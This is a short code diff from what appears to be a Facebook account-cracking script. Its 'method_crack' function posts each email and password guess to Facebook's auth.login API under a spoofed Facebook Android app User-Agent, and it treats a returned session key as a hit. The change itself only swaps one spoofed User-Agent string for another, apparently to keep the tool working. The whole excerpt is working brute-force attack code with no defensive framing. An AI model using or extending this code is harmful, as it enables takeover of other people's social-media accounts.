@@ -105,7 +105,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/486988207;FBDM/{density=2.625,width=1080,height=2132};FBLC/fr_FR;FBRV/488857776;FBCR/Orange;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.2;FBSV/11;FBOP/1;FBCA/arm64-v8a'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/440587307;FBDM/{density=1.875,width=720,height=1350};FBLC/es_LA;FBRV/442485691;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia C01 Plus;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi'}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
